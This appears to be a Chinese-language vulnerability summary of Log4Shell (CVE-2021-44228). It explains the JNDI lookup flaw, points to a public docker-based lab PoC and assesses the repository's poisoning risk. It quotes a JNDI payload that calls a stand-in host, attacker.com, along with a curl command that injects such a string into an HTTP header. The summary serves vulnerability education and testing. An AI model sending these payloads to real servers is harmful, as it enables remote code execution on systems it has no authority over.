## CVE-2021-44228 Log4Shell 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 <= version <= 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的Log4j2，且允许外部网络访问，日志记录功能开启并且记录用户可控的输入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是一个严重的安全漏洞，存在于Apache Log4j2 2.0-beta9到2.15.0版本中（不包括安全版本2.12.2、2.12.3和2.3.1）。

**漏洞利用方式：**

该漏洞源于Log4j2中的JNDI（Java Naming and Directory Interface）功能，该功能允许从LDAP和其他JNDI相关端点加载代码。当攻击者能够控制日志消息或日志消息参数时，他们可以利用此功能执行从LDAP服务器加载的任意代码。攻击者通过在Log4j2可以解析的日志消息中插入恶意JNDI查找字符串，例如`${jndi:ldap://attacker.com/evil}`，来触发该漏洞。当Log4j2尝试解析此字符串时，它会向`attacker.com`上的LDAP服务器发出请求，并执行从该服务器返回的Java代码。

提供的POC代码利用了这一点，使用`docker-compose`快速搭建了一个包含漏洞应用(`vul`)、LDAP服务器(`ldap_server`)和恶意代码服务器(`exploit_server`)的实验环境。利用步骤如下：

1.  使用`docker-compose up -d`启动实验环境。
2.  使用`curl`命令向漏洞应用发送包含恶意JNDI查找字符串的HTTP请求，例如：`curl -X GET http://localhost:8080/ -H "X-Api-Version: ${jndi:ldap://my_ldap_server:1389/a}"`。 其中`my_ldap_server`指向 docker-compose 启动的 ldap_server。
3.  LDAP服务器将请求重定向到恶意代码服务器，下载并执行恶意代码。
4.  验证漏洞是否成功利用，通常通过检查`vul`容器上的文件或观察其他系统行为。

**有效性：**

根据漏洞描述、搜索引擎结果和提供的POC代码，可以判断该POC代码是有效的。大量的安全报告和漏洞分析都确认了CVE-2021-44228的可利用性，并且该POC代码提供了一个易于部署的实验环境，用于验证该漏洞。

**投毒风险：**

评估该POC代码的投毒风险较低，大约10%。原因如下：

*   **明确的用途：** 该代码库旨在提供一个用于演示和测试Log4Shell漏洞的实验环境，其主要功能是复现漏洞，方便用户理解和学习。
*   **可见的组件：** 该代码库包含了`docker-compose.yml`文件以及构建LDAP服务器、恶意代码服务器的Dockerfile，这些文件是公开可见的，便于用户检查和审计。
*   **简单的逻辑：** 实验环境的搭建和漏洞利用流程相对简单，易于理解和验证。
*   **潜在的风险：** 尽管该代码库的主要目的是演示漏洞利用，但仍存在潜在的风险。例如，如果用户直接在生产环境中使用该代码库，可能会暴露其系统，受到攻击。此外，恶意攻击者可能会修改该代码库，添加恶意代码，然后传播给不知情的用户。但考虑到公开的性质和广泛的审查，直接包含恶意代码的可能性较低。

**风险缓减：**
* 下载代码后,仔细检查`docker-compose.yml`以及Dockerfile文件,确保没有恶意配置或者代码.
* 运行前务必搭建隔离环境,避免直接在生产环境中使用.

**项目地址:** [ShlomiRex/log4shell_lab](https://github.com/ShlomiRex/log4shell_lab)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)